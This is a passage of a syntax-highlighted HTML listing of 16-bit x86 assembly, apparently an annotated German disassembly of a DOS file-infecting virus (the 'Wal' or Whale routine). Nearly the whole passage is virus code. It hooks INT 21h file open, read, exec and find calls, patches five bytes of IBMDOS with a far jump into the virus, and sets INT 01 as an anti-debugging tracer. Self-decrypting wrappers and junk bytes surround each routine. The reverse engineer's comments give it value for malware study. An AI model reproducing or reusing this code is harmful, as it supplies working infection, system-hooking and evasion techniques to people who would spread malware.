                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc5">L0996</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 31A6  ; OPEN FILE / HANDLE</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc5">L09E4</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 31F4  ; CLOSE File / Handle</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc5">L1E5E</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 466E  ; READ File / Handle</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc5">L1DA2</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 45B2  ; SEEK / Handle</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc5">L0AD4</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 325D  ; EXEC</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc5">L1F70</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 4780  ; FindFirst ASCIIZ</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc5">L1F70</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 4780  ; FindNext  ASCIIZ</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc5">L1D0F</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 451F  ; Set/Get Filedate</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02B72</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Adresse in D2598</span><span class="sc0">
</span><span class="sc5">J02B7B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
</span><span class="sc5">J02B7E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Springe zu [2598]</span><span class="sc0">
</span><span class="sc1">;================================================================()===</span><span class="sc0">
</span><span class="sc5">J02B87</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">              </span><span class="sc1">; ?!?!?!</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0491B</span><span class="sc0">

</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================================( Low-INT-21h aufrufen )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02B8B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J048F3</span><span class="sc0">
</span><span class="sc1">;=========================================================( trash )===</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( Beendet Int21h )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">IRET_Int21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirStack</span><span class="sc0">
</span><span class="sc5">J02BA3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; PUSH Flags nach IRET</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; POP  Flags ---"----</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Re_SET_Int_02</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02BB6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( Pop alle Register )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">; ---------------- hilfsweise eingefÅgt :</span><span class="sc0">
</span><span class="sc1">;       J02BB6: XLAT</span><span class="sc0">
</span><span class="sc1">;               CMP     AL,0FFh</span><span class="sc0">
</span><span class="sc1">;               JZ      J02BA3</span><span class="sc0">
</span><span class="sc1">;               XCHG    AL,BYTE PTR DS:[0C912H] ; MUELL !!!</span><span class="sc0">
</span><span class="sc1">;               JMP     J02BBF</span><span class="sc0">
</span><span class="sc1">; ---------------- hilfsweise eingefÅgt :</span><span class="sc0">
</span><span class="sc1">;       J02BBC: PUSH    ES</span><span class="sc0">
</span><span class="sc1">;               ADC     CL,CL</span><span class="sc0">
</span><span class="sc1">;               JMP     J02BBF</span><span class="sc0">
</span><span class="sc1">; ---------------- Ende einfÅgung</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( Pop alle Register )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02BBC</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">PopALL</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">J02BBF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">11</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================( Holt alle Register aus dem Vir-Stack )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GetRegsFromVirstack</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2557</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2559</span><span class="sc4">],</span><span class="sc8">SS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Vir_SP</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">PopALL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2559</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Vir_SP</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2557</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BEh</span><span class="sc0">                            </span><span class="sc1">;02C05</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0AFh</span><span class="sc0">                            </span><span class="sc1">;02C06</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"4"</span><span class="sc0">                             </span><span class="sc1">;02C07</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Eh</span><span class="sc0">                             </span><span class="sc1">;02C08</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"[SZR"</span><span class="sc0">                          </span><span class="sc1">;02C09</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8Fh</span><span class="sc0">                             </span><span class="sc1">;02C0D</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc0">                             </span><span class="sc1">;02C0E</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========( 2c0f )=======================( Patcht INT 21 in IBMDOS )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Patch_IBMDOS</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D244B</span><span class="sc0">
                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Low_INT_21H</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0"> </span><span class="sc1">; Tauscht 5 Byte im DOS aus gegen</span><span class="sc0">
                                 </span><span class="sc1">; einen FAR-JMP zur Wal-Routine !</span><span class="sc0">
</span><span class="sc5">J02C22</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">LODSB</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J02C22</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">13</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================( trash ?!? )===</span><span class="sc0">
</span><span class="sc5">J02C31</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J02C31</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">                    </span><span class="sc1">;... trash !</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================( pusht alle register)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">PushALL</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">14</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( setzt INT 01 auf Tracer)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SetInt_01</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Int_01_entry</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">                       </span><span class="sc1">; SET INT 01</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================( setzt INT ( nummer in AL) auf DS:DX )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SetInt_AL</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">J02C88</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================(sichert Register auf eigenem Stack)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SaveRegisters</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2557</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2559</span><span class="sc4">],</span><span class="sc8">SS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Vir_SP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">PUSHALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2559</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Vir_SP</span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2557</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">17</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================( holt INT ( nummer AL ) nach ES:BX)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GetInt_AL</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">18</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================( Zweiter Teil der Trace-Routine J02A63 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02CD8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; AX = 2A7Dh</span><span class="sc0">
</span><span class="sc5">J02CDA</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; = INC  SI</span><span class="sc0">
                                </span><span class="sc1">;   OR   [BX],AL</span><span class="sc0">
                                </span><span class="sc1">;   XCHG BX,[BP+08h] , usw.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],+</span><span class="sc2">07h</span><span class="sc0">  </span><span class="sc1">; Change IP after IRET  ??</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">@0478</span><span class="sc0">           </span><span class="sc1">; = ADD SI,@FB88</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">SwapCode_6</span><span class="sc0">      </span><span class="sc1">; 04EFh</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                 </span><span class="sc1">; Original BP aus Trace-Routine</span><span class="sc0">
                                           </span><span class="sc1">; J02A63</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">SwapCode_8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; dort steht "E9CF"</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">; AX = "E9CF"</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">020Ch</span><span class="sc0">           </span><span class="sc1">; AX = "EBC3"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; PATCHT INT 3 WEG : INT 3 -&gt; RET</span><span class="sc0">
                                   </span><span class="sc1">; Spielt aber gefÑhrlich mit der Queue,</span><span class="sc0">
                                   </span><span class="sc1">; kein Wunder, dass das Teil auf ATs</span><span class="sc0">
